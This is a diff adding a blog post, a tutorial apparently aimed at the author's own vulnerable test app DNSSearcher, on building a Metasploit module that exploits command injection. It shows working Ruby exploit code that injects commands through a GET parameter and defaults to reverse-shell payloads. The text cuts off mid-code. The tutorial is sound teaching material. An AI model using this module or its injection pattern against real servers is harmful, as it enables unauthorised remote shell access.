@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Making a Custom Metasploit Module | Connor Shade</title>
+<meta name="title" content="Making a Custom Metasploit Module" />
+<meta name="description" content="Making a Metasploit module to exploit DNSSearcher" />
+<meta name="keywords" content="metasploit,exploit,meterpreter,ruby,tool," />
+
+
+
+
+
+
+  
+  <meta property="og:title" content="Making a Custom Metasploit Module" />
+<meta property="og:description" content="Making a Metasploit module to exploit DNSSearcher" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://connorshade.com/service-to-shell/custom-metasploit/" /><meta property="article:section" content="service-to-shell" />
+<meta property="article:published_time" content="2023-08-03T19:29:20-04:00" />
+<meta property="article:modified_time" content="2023-08-07T13:10:22-04:00" />
+
+
+  
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Making a Custom Metasploit Module"/>
+<meta name="twitter:description" content="Making a Metasploit module to exploit DNSSearcher"/>
+
+
+  
+  <meta itemprop="name" content="Making a Custom Metasploit Module">
+<meta itemprop="description" content="Making a Metasploit module to exploit DNSSearcher"><meta itemprop="datePublished" content="2023-08-03T19:29:20-04:00" />
+<meta itemprop="dateModified" content="2023-08-07T13:10:22-04:00" />
+<meta itemprop="wordCount" content="4815">
+<meta itemprop="keywords" content="metasploit,exploit,meterpreter,ruby,tool," />
+
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  
+  <link href="/style.min.css" rel="stylesheet">
+
+  
+  <link href="/syntax.min.css" rel="stylesheet">
+
+  
+
+  
+</head>
+
+<body>
+  <header><a href="/" class="title"><h1>Connor Shade</h1></a>
+<nav>
+  <a href="/">Home</a>
+
+  <a href="/author/">Author</a>
+
+  <a href="/projects/">Projects</a>
+
+  <a href="/post/">All Posts</a>
+
+  <a href="/tags/">All Tags</a>
+
+
+<a href="/index.xml">RSS</a>
+
+</nav>
+</header>
+  <main>
+<h1>Making a Custom Metasploit Module</h1>
+
+
+
+<span><i>Published 03.08.2023</i></span>
+
+    <span><i>, Last Edited 07.08.2023</i></span>
+
+<br>
+
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#research">Research</a>
+      <ul>
+        <li><a href="#how-to-get-a-metasploit-environment">How to get a Metasploit environment</a></li>
+      </ul>
+    </li>
+    <li><a href="#writing-a-module">Writing a module</a>
+      <ul>
+        <li><a href="#finding-the-right-module-type">Finding the right module type</a></li>
+        <li><a href="#how-to-write-a-command-stager">How to write a command stager</a></li>
+        <li><a href="#imports">Imports</a></li>
+        <li><a href="#defining-metadata">Defining metadata</a></li>
+        <li><a href="#filters">Filters</a></li>
+        <li><a href="#throwing-the-exploit">Throwing the exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#testing-the-module">Testing the module</a>
+      <ul>
+        <li><a href="#module-wont-load">Module won&rsquo;t load</a></li>
+        <li><a href="#import-error">Import error</a></li>
+        <li><a href="#weird-errors-in-the-application">Weird errors in the application</a></li>
+        <li><a href="#couldnt-get-a-callback">Couldn&rsquo;t get a callback</a></li>
+      </ul>
+    </li>
+    <li><a href="#some-improvements">Some Improvements</a>
+      <ul>
+        <li><a href="#adding-a-check">Adding a check</a></li>
+        <li><a href="#adding-command-stager">Adding command stager</a></li>
+        <li><a href="#getting-the-other-stagers-echo-printf-working">Getting the other stagers (echo, printf) working</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+
+<p>Welcome to part three of <a href="https://connorshade.com/service-to-shell/">service-to-shell</a>.
+In this post we&rsquo;ll cover the basics of exploiting DNSSearcher by using Metasploit, along with command stagers, to get a full Meterpreter session on the target.
+I&rsquo;ll do my best to cover best practices - if you have a similarly vulnerable webapp, I hope this is a useful tutorial, or something interesting to read.</p>
+<h2 id="research">Research</h2>
+<h3 id="how-to-get-a-metasploit-environment">How to get a Metasploit environment</h3>
+<p>If you&rsquo;re running on a machine where you <em>want</em> to install Metasploit (or where it&rsquo;s already installed), this shouldn&rsquo;t be a problem.
+Based on <a href="https://youtu.be/SOy87RUjsoU">this video by Hak5 titled &ldquo;Making your first AUX Module&rdquo;</a>, you can just add modules in the correct Metasploit directory (Should be <code>~/.msf4</code>).
+I don&rsquo;t really want to install Metasploit, clutter my install with a bunch of ruby gems, or even push these contributions upstream.
+For these reasons I&rsquo;ll be using the Dockerfile within the metasploit-framework repo and just rebuild the Docker image whenever I make changes (if it&rsquo;s even necessary - we&rsquo;ll see).</p>
+<p>I&rsquo;ll start by cloning the metasploit-framework repo with a depth of 1 - we don&rsquo;t need any past commits here (and by itself, a depth of 1 was 60.79MiB):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">git clone git@github.com:rapid7/metasploit-framework.git --depth <span class="m">1</span>
+</span></span></code></pre></div><h4 id="docker">Docker</h4>
+<p>From here I checked out the <code>docker/README.md</code>, which suggests using <code>docker/bin/msfconsole</code> for running the Docker image. It&rsquo;s just a wrapper for <code>docker-compose</code> (which for me is <code>docker compose</code>), but it saves me from typing a docker command. After modifying the <code>docker/bin/msfconsole</code> to use <code>docker compose</code>, I ran these commands:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">chmod +x ./docker/bin/msfconsole
+</span></span><span class="line"><span class="ln">2</span><span class="cl">./docker/bin/msfconsole --rebuild
+</span></span><span class="line"><span class="ln">3</span><span class="cl">./docker/bin/msfconsole
+</span></span></code></pre></div><p>It took ~160 seconds for the Docker image to build, but then&hellip; an error (provided below for if/when you hit it - this probably won&rsquo;t happen if you&rsquo;re running as root):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="ln">1</span><span class="cl">Rails Error: Unable to access log file. Please ensure that /home/msf/.msf4/logs/production.log exists and is writable (i.e. make it writable for user and group: chmod 0664 /home/msf/.msf4/logs/production.log). The log level has been raised to WARN and the output directed to STDERR until the problem is fixed.
+</span></span><span class="line"><span class="ln">2</span><span class="cl">/usr/local/lib/ruby/3.0.0/fileutils.rb:253:in `mkdir&#39;: Permission denied @ dir_s_mkdir - /home/msf/.msf4/logs (Errno::EACCES)
+</span></span></code></pre></div><p>I checked the Dockerfile, but saw no references to <code>/home/msf/.msf4/</code>. Looking inside the <code>docker-compose.yml</code> file though, we see:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nt">services</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w">  </span><span class="nt">ms</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">metasploitframework/metasploit-framework:latest</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w">    </span><span class="nt">environment</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w">      </span><span class="nt">DATABASE_URL</span><span class="p">:</span><span class="w"> </span><span class="l">postgres://postgres@db:5432/msf?pool=200&amp;timeout=5</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w">    </span><span class="nt">links</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w">      </span>- <span class="l">db</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w">    </span><span class="nt">ports</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w">      </span>- <span class="m">4444</span><span class="p">:</span><span class="m">4444</span><span class="w">
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w">    </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w">      </span>- <span class="l">$HOME/.msf4:/home/msf/.msf4</span><span class="w">
+</span></span></span></code></pre></div><p>Okay, so this is definitely a Docker permissions error, I ran into a ton of those while setting up my homelab.
+The solution I had was to use the UID and GID variables for the Docker images I was working with, and ensure they matched the NFS share owner.
+In this case I <a href="https://github.com/rapid7/metasploit-framework/issues/13161">checked the GitHub</a> and saw that the solution is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">sudo chown -R <span class="k">$(</span>whoami<span class="k">)</span>:<span class="k">$(</span>whoami<span class="k">)</span> /home/<span class="k">$(</span>whoami<span class="k">)</span>/.msf4
+</span></span><span class="line"><span class="ln">2</span><span class="cl">./docker/bin/msfconsole
+</span></span></code></pre></div><p>At this point I have a <code>.msf4</code> directory mapped to <code>$HOME/.msf4</code> and a Docker container that drops me into a Metasploit console.
+To work with my workflow, it&rsquo;s preferable if the container&rsquo;s <code>/home/msf/.msf4</code> directory was mapped to my <code>service-to-shell/msf4</code> folder.
+I&rsquo;ll slightly modify the <code>docker-compose</code> with the correct filepath and try again:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="ln">1</span><span class="cl"><span class="c"># rest of file unchanged</span><span class="w">
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="w">    </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="w">      </span>- <span class="l">$HOME/Documents/git/service-to-shell/msf4:/home/msf/.msf4</span><span class="w">
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="w"></span><span class="c"># rest of file unchanged</span><span class="w">
+</span></span></span></code></pre></div><p>I&rsquo;ll test this out with a simple file. On my host machine I run <code>touch /home/connor/Documents/git/service-to-shell/msf4/test.txt</code>, and then in the metasploit-framework container I run <code>ls /home/msf/.msf4</code> - here&rsquo;s the output:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">msf6 &gt; ls /home/msf/.msf4
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> exec: ls /home/msf/.msf4
+</span></span><span class="line"><span class="ln">3</span><span class="cl">
+</span></span><span class="line"><span class="ln">4</span><span class="cl">bootsnap_cache  data            <span class="nb">local</span>           logos           logs            loot            modules         plugins         store           test.txt
+</span></span><span class="line"><span class="ln">5</span><span class="cl">msf6 &gt;
+</span></span></code></pre></div><p>Fantastic - now any custom modules I make are also available in the <a href="https://github.com/cnnrshd/service-to-shell">service-to-shell</a> repo, easy to share and easy for anyone else to use.
+Based on the Hak5 video above, I should be able to just drop a module in a folder like <code>.msf4/modules/custom</code> and load everything from there (in a running console) with <code>loadpath /home/msf/.msf4</code>.
+Let&rsquo;s test it out with a sample module.</p>
+<h2 id="writing-a-module">Writing a module</h2>
+<p>Before writing a module it&rsquo;s best to ask &ldquo;What is my goal with this module?&rdquo;
+<em>I want to exploit DNSSearcher through Metasploit</em>.</p>
+<h3 id="finding-the-right-module-type">Finding the right module type</h3>
+<p>DNSSearcher is exploitable through a GET request with command injection.
+I checked the Metasploit docs on &ldquo;Developing Modules and found this:</p>
+<blockquote>
+<p>If you&rsquo;ve found a way to execute a command on a target, and you&rsquo;d like the [sic] leverage that ability to execute a command into a meterpreter session, command stagers are for you.
+— <!-- raw HTML omitted -->Metasploit Documentation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted --></p>
+</blockquote>
+<p>A command module is exactly what I need.
+The example case they&rsquo;ve included is actually command injection through a webapp that performs <code>ping</code> requests - pretty similar to DNSSearcher.</p>
+<h3 id="how-to-write-a-command-stager">How to write a command stager</h3>
+<p>I initially started by following the documentation, but I found that the documentation was confusing.
+It had chunks for <code>execute_cmdstager</code> and <code>execute_cmd</code> while working off bits and pieces of other scripts.
+The <code>execute_command</code> module in the documentation is more complex than it has to be (We don&rsquo;t need to reference the <code>datastore</code>, as an example), and I think it&rsquo;s incorrect in some places (I was getting an <code>undefined</code> error when calling <code>send_request_cgi</code> until I imported <code>Msf::Exploit::Remote::HttpClient</code>).</p>
+<p>Instead of walking you through that documentation, I&rsquo;ll attempt to make something better below. I&rsquo;m providing working code instead of sample code, and I&rsquo;ll cover issues I had later in this doc - bear with me, I&rsquo;ve never written Ruby before:</p>
+<h3 id="imports">Imports</h3>
+<p>We need to start at the top of the module. Every exploit module starts with <code>class MetasploitModule &lt; Msf::Exploit::Remote</code> - this is creating a subclass of <code>Msf::Exploit::Remote</code> named <code>MetasploitModule</code>. I think it&rsquo;s interesting that the subclass name doesn&rsquo;t need to be unique.</p>
+<p>Next are the imports. We actually don&rsquo;t need to import <code>Msf::Exploit::CmdStager</code> since we&rsquo;re not doing a staged payload to begin with - simply importing <code>Msf::Exploit::Remote::HttpClient</code> is fine. After this, we can set the ranking. Based on the <a href="https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html">Exploit Ranking documentation</a>, even though this module does not crash the service, there is no check written yet, so we&rsquo;ll call it good for now:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">class</span> <span class="nc">MetasploitModule</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="no">Rank</span> <span class="o">=</span> <span class="no">GoodRanking</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">HttpClient</span>
+</span></span></code></pre></div><h3 id="defining-metadata">Defining metadata</h3>
+<p>The next section of the Module is for defining metadata.
+This includes <strong>Author</strong> information, <strong>Exploit</strong> information, and valid <strong>Target</strong> information. Anything I don&rsquo;t think is self-explanatory has comments</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln"> 1</span><span class="cl">    <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span> <span class="c1"># I don&#39;t know why calls are made to update_info instead of filling this out, but every module is like this</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">      <span class="k">super</span><span class="p">(</span> <span class="c1"># passes this to Msf::Exploit::Remote&#39;s update_info?</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">        <span class="n">update_info</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">          <span class="n">info</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">          <span class="s1">&#39;Name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Command Injection against DNSSearcher v0.1.0 Using Unix Command&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">          <span class="s1">&#39;Description&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;This exploits a command injection aganst dnssearcher using the command stager.&#39;</span>          <span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">          <span class="s1">&#39;License&#39;</span> <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">          <span class="s1">&#39;Author&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;Connor Shade&#39;</span> <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">          <span class="s1">&#39;References&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="o">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;https://connorshade.com/service-to-shell/custom-metasploit/&#39;</span> <span class="o">]</span> <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">          <span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="c1"># used for determining compatibility</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">          <span class="c1"># For webapps, platform is typically the language of the webapp, I&#39;m unsure since this is command injection on the webserver though</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">          <span class="s1">&#39;Targets&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">            <span class="o">[</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">              <span class="s1">&#39;Unix Command&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">              <span class="p">{</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">                <span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;unix&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">                <span class="s1">&#39;Arch&#39;</span> <span class="o">=&gt;</span> <span class="no">ARCH_CMD</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">                <span class="s1">&#39;Type&#39;</span> <span class="o">=&gt;</span> <span class="ss">:unix_cmd</span><span class="p">,</span> <span class="c1"># type of exploit</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">                <span class="s1">&#39;DefaultOptions&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">                  <span class="s1">&#39;PAYLOAD&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;cmd/unix/reverse_bash&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">                  <span class="s1">&#39;RPORT&#39;</span> <span class="o">=&gt;</span> <span class="mi">8000</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">              <span class="p">}</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">          <span class="s1">&#39;Payload&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="s1">&#39;BadChars&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="p">},</span> <span class="c1"># Characters that cannot exist in the payload?</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">          <span class="s1">&#39;Privileged&#39;</span> <span class="o">=&gt;</span> <span class="kp">true</span><span class="p">,</span> <span class="c1"># Whether or not this requires or gives privileged access https://github.com/rapid7/metasploit-framework/blob/9e7960fd9ffe5cc2866e047aa75193d9858603e8/modules/exploits/example_webapp.rb#L61</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">          <span class="s1">&#39;DisclosureDate&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;2023-08-04&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">          <span class="s1">&#39;DefaultTarget&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># 0th item in Targets https://github.com/rapid7/metasploit-framework/blob/9e7960fd9ffe5cc2866e047aa75193d9858603e8/modules/exploits/example.rb#L61C15-L61C15</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">          <span class="s1">&#39;Notes&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="c1"># Required for new modules https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="s1">&#39;Stability&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="no">CRASH_SAFE</span><span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="s1">&#39;Reliability&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="no">REPEATABLE_SESSION</span><span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="s1">&#39;SideEffects&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="no">IOC_IN_LOGS</span><span class="o">]</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">      <span class="p">)</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">end</span>
+</span></span></code></pre></div><p>I actually did check every other module in Metasploit, none defined <code>info</code> values in the call to <code>initialize</code>:</p>
+<p><img src="./images/empty_info.png" alt="A screenshot of a VSCode search across the metasploit-framework codebase, showing that there were no instances of info having any arguments" title="A screenshot of a VSCode search across the metasploit-framework codebase, showing that there were no instances of info having any arguments"></p>
+<h3 id="filters">Filters</h3>
+<p>The example includes some characters that must be filtered out, and I&rsquo;m glad it shows me the Ruby way to do things.
+The chars that must be filtered for this exploit are a little different than the example, but the idea is the same.
+Anything that might be treated unusually before hitting <code>/bin/bash</code> needs to be escaped - mostly <code>&amp;</code>.
+One interesting thing about this is <code>gsub!</code> modifies in place while <code>gsub</code> returns - I missed that at first.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln">1</span><span class="cl">    <span class="k">def</span> <span class="nf">filter_bad_chars</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">        <span class="n">cmd</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="sr">/&amp;/</span><span class="p">,</span> <span class="s1">&#39;%26&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">        <span class="n">cmd</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="sr">/ /</span><span class="p">,</span> <span class="s1">&#39;%20&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">        <span class="n">cmd</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="sr">/&#39;/</span><span class="p">,</span> <span class="s1">&#39;%27&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">      <span class="k">end</span>
+</span></span></code></pre></div><h3 id="throwing-the-exploit">Throwing the exploit</h3>
+<p>This chunk here defines how the command is sent to the server (in this case, via <code>get</code> parameters to the <code>/dns</code> endpoint) and defines the <code>exploit</code> function. This is pretty simple - <code>send_request_cgi</code> is used to send the GET request (I belive it already knows what RHOST is), while <code>exploit</code> runs when you call <code>run</code> within msfconsole. <code>execute_command</code> can also be used by a stager:</p>
+<blockquote>
+<p>By including Msf::Exploit::CmdStager you are given access to a method called execute_cmdstager. execute_cmdstager makes a list of required commands to encode, upload, save, decode, and execute your payload, then uses the execute_command method you defined earlier to run each command on the target.
+— <!-- raw HTML omitted -->Metasploit Documentation<sup id="fnref1:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted --></p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln"> 1</span><span class="cl">    <span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">_opts</span> <span class="o">=</span> <span class="p">{})</span> <span class="c1"># This just seems to be the default signature</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">        <span class="n">send_request_cgi</span><span class="p">({</span> <span class="c1"># No parsing required</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">            <span class="s1">&#39;method&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">            <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;/dns&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">            <span class="s1">&#39;encode_params&#39;</span> <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span> <span class="c1"># Encoding is already done and necessary chars are replaced with filter_bad_chars</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">            <span class="s1">&#39;vars_get&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="c1"># GET parameters</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">              <span class="s1">&#39;domainname&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;bing.com%20%26%26%20</span><span class="si">#{</span><span class="n">filter_bad_chars</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="c1"># The only one is domainname, which is the injectable param</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">end</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">  
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">def</span> <span class="nf">exploit</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Executing </span><span class="si">#{</span><span class="n">target</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2"> for </span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;PAYLOAD&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">execute_command</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encoded</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">      <span class="k">end</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">end</span>
+</span></span></code></pre></div><p>Putting that all together, we have a fully functional module that can throw an exploit and get a shell.
+Here is a <a href="https://github.com/cnnrshd/service-to-shell/blob/307b0e771c8562122ed8a15e56879c8445ac43eb/msf4/modules/exploits/custom/dnssearcher.rb#L0-L1">permalink</a> to <code>dnssearcher.rb</code> at this state.
+Next I&rsquo;ll cover some of the testing I had to do to get to this state.</p>
+<h2 id="testing-the-module">Testing the module</h2>
+<p>This is the work I went through to get the working exploit above.
+You may want to skip this section and just come back to it if you have issues making your own module.</p>
+<h3 id="module-wont-load">Module won&rsquo;t load</h3>
+<p>My first issue was that my module wasn&rsquo;t loading.
+I stared with a very basic version of the example from the documentation, something like:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">CmdStager</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s1">&#39;Targets&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">      <span class="o">[</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">        <span class="s1">&#39;Unix Command&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">          <span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;unix&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">          <span class="s1">&#39;Arch&#39;</span> <span class="o">=&gt;</span> <span class="no">ARCH_CMD</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">          <span class="s1">&#39;Type&#39;</span> <span class="o">=&gt;</span> <span class="ss">:unix_cmd</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">          <span class="s1">&#39;DefaultOptions&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">            <span class="s1">&#39;PAYLOAD&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;cmd/unix/python/meterpreter/reverse_tcp&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="s1">&#39;RPORT&#39;</span> <span class="o">=&gt;</span> <span class="mi">9000</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">      <span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">      <span class="o">[</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="s1">&#39;Linux (Dropper)&#39;</span><span class="p">,</span>
